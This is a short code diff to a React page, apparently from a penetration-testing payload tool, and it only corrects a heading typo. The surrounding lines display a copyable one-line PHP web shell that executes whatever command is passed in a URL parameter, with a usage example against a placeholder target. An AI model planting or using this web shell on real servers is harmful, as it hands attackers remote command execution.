@@ -355,7 +355,7 @@ export default (props) => {
 					marginTop: 15
 				}}
 			>
-				<Title>Obfuscate PHP Web Shell</Title>
+				<Title>Obfuscated PHP Web Shell</Title>
 				<Paragraph copyable>{'<?=`$_GET[0]`?>'}</Paragraph>
 				<Paragraph>{' Usage : http://target.com/path/to/shell.php?0=command '}</Paragraph>
 				<Button
